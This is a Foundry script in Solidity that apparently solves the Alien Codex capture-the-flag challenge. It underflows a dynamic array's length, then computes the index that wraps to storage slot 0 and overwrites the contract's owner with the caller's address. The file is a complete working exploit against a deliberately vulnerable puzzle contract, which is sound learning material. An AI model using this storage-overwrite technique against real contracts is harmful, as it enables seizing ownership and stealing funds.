// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

contract AlienCodexSolve is Script {
    IAlienCodex alien = IAlienCodex(0xa896e4cD2Df2107270a2C1000788aAdEdff0A1C8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        alien.makeContact();
        alien.retract();

        uint256 ownerslot = type(uint256).max;
        uint256 slot0 = uint256(keccak256(abi.encode(uint256(1))));
        uint256 difference = ownerslot - slot0 + 1;

        alien.revise(difference, bytes32(uint256(uint160(vm.envUint("MY_ADDRESS")))));
        console.logBytes32(vm.load(address(alien), bytes32(uint256(0))));
        vm.stopBroadcast();
    }
}

interface IAlienCodex {
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
    function retract() external;
    function owner() external returns (address);
}
